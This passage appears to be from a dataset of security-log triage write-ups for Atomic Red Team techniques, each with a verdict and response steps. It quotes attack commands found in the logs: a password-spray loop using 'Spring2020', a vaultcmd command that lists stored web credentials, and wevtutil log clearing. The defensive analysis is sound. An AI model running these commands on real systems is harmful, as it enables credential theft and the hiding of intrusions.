  - The pattern aligns with attempts to obfuscate activities, a red flag for unauthorized access or insider threat.

### **Resolution: SUSPICIOUS**

The activity in the logs does not conclusively prove malicious intent but indicates suspicious behavior requiring further investigation. Given the context—log clearing across all major streams, potential data discovery, and execution of high-privilege processes—the risk is elevated for unauthorized access or insider threat actions.

### **Guidance:**

- **Immediate Actions:**
  - Quickly engage local system administrators to verify if these actions were authorized as part of maintenance.
  - Isolate the affected machine (if not already) to prevent further unauthorized access.
  - Review access logs and account histories, particularly for `admin_test`.
  - Conduct a thorough forensic investigation for file usage and system changes leading up to and following this event sequence.

Password Spray all Domain Users,"Upon reviewing the provided Windows event logs, the following observations were made:

### Suspicious or Anomalous Behavior

1. **Command Execution Patterns:**
   - Multiple instances of `cmd.exe` being executed with specific command lines are present in the logs. Notably, the command `""cmd.exe"" /c if not exist %%temp%%\users.txt (exit /b 1)` appears multiple times (Event Records 17950, 17954, 17958), suggesting a scripted logic potentially for checking file existence within a temporary directory.
   - The command `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1110.003\src\parse_net_users.bat""` is executed, indicating possible execution of a batch script linked to Atomic Red Team, a tool known for emulating adversary tactics for security testing. This tool can be benign in a testing context but suspicious if its presence or execution was not authorized.
   - Another concerning command line (Event Record 17990): `""cmd.exe"" /c @FOR /F %%n in (%%temp%%\\users.txt)`, appears to attempt to iterate over user entries attempting connections using the password ""Spring2020"". This implies an unsanctioned password spraying attack or similar activity.

2. **Event Log Clearing:**
   - The use of `wevtutil.exe` to clear event logs (System log clearance at Event Record 3566, Security log clearance at Event Record 30348, and Windows PowerShell log clearance at Event Record 3567). Log clearance is a common tactic used by adversaries to cover tracks.

3. **Use of `wevtutil.exe`:**
   - The command `wevtutil cl` is used to clear various log channels (e.g., Microsoft-Windows-Sysmon/Operational, Application, Security, and System logs). Executed from what appears to be administrative or elevated privilege processes (`wsmprovhost.exe`), this indicates a deliberate attempt to erase traces of activity.

4. **Privileged Execution:**
   - The frequent high-level integrity execution and a range of privileges are reported for the same user `admin_test` (Event Records 30351 and 30352), suggesting use or misuse of administrative privileges.

### Indicators of Malicious Activity

The analysis has identified several potential indicators of compromise:

- Use of Atomic Red Team scripts without explicit context or authorization could suggest an internal security test. However, it warrants further investigation.
- Suspicion arises from batch scripts attempting network logons using common or default passwords, pointing towards malicious intent, ideally resembling PEN testing or an actual infiltration attempt.
- Explicit clearing of event logs strongly indicates malicious activity. It's a tactic used to disrupt forensic investigations and hide malicious operations.
- The repeated execution of `cmd.exe` with suspicious command lines and scripts may indicate illicit attempts to manipulate system configurations or credentials stealthily.

### Assessment

Based on the observations and behaviors noted above, the situation indicates potential malicious activity. The unauthorized execution of scripts, especially those attempting credential stuffing and the clearing of event logs, combined with the use of command lines linked to penetration testing tools, strongly suggests hostile intent.

### Recommendation and Resolution

Ensuring comprehensive monitoring and enhancing incident response capabilities will aid in better detection and response to similar activities in the future."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"Based on the provided logs, the following analysis and observations were made:

### Analysis of Events

1. **PowerShell Logs:**
   - The PowerShell events indicate the execution of a script using `vaultcmd` to list ""Web Credentials."" The specific command executed was `powershell.exe & {vaultcmd /listcreds:\""Web Credentials\"" /all}`. Accessing Credential Vault without explicit administrative action can potentially be suspicious, especially if the activity was not scheduled and the command-line parameter was obfuscated. Here, given the context of the CEO's machine, this might signify an intruder attempting to access saved credentials.

2. **System Logs:**
   - Multiple log clearance events were recorded, executed by an account named `admin_test`. Clearing logs can be indicative of an attempt to hide malicious activity, suggesting potentially malicious intent.
   - Windows Defender and system logs were cleared without specifying legitimate user intent, raising suspicion.

3. **Security Logs:**
   - An event indicates logging of the security log being cleared by `admin_test`. Similar to system logs, clearing security logs can imply an attempt to cover up actions carried out by the user, potentially malicious.

4. **Application Logs:**
   - The application log indicates routine activities, such as Windows Defender being on. Services related to Microsoft Edge update activities were recorded, showing common application management activities.
   - However, the edgeupdate service stops around the same timeframe as the potential malicious PowerShell activity, which might be used as a distraction or parallel action to downloading or executing other payloads.

5. **Sysmon Logs:**
   - `whoami.exe` and `wevtutil.exe` executions are common in environments. However, `wevtutil.exe` was used to clear event logs (evidenced by context in system and security logs), further emphasizing actions aimed at log manipulation.
   - The presence of `hostname.exe` and `taskhostw.exe` are standard Windows operations.
   - `VaultCmd.exe` was run to list credentials, which aligns with the potentially suspicious PowerShell activity mentioned earlier.

### Assessment

The logs collectively indicate a strong likelihood of malicious intent:
- There is a pattern of accessing sensitive credential storage script running (`vaultcmd` through PowerShell) without clear legitimate action.
- System and security log clearing by the `admin_test` account suggests a possible effort to delete traces of activity, a common tactic by intruders.
- The combination of command execution utilizing sensitive access capabilities (such as vaultcmd) and steps to hide these activities (event log clearance) supports the notion of a potential breach.

### Recommendation

- **Resolution: MALICIOUS**

Immediate actions are necessary:
- Initiate a full internal investigation to determine how the commands were executed and verify the integrity of the CEO’s machine.
- Instigate an incident response protocol, isolate the affected host from the network, and conduct further forensic analysis to understand the scope of compromise.
- Audit the actions of the `admin_test` account, verifying any unusual login times or external accesses.
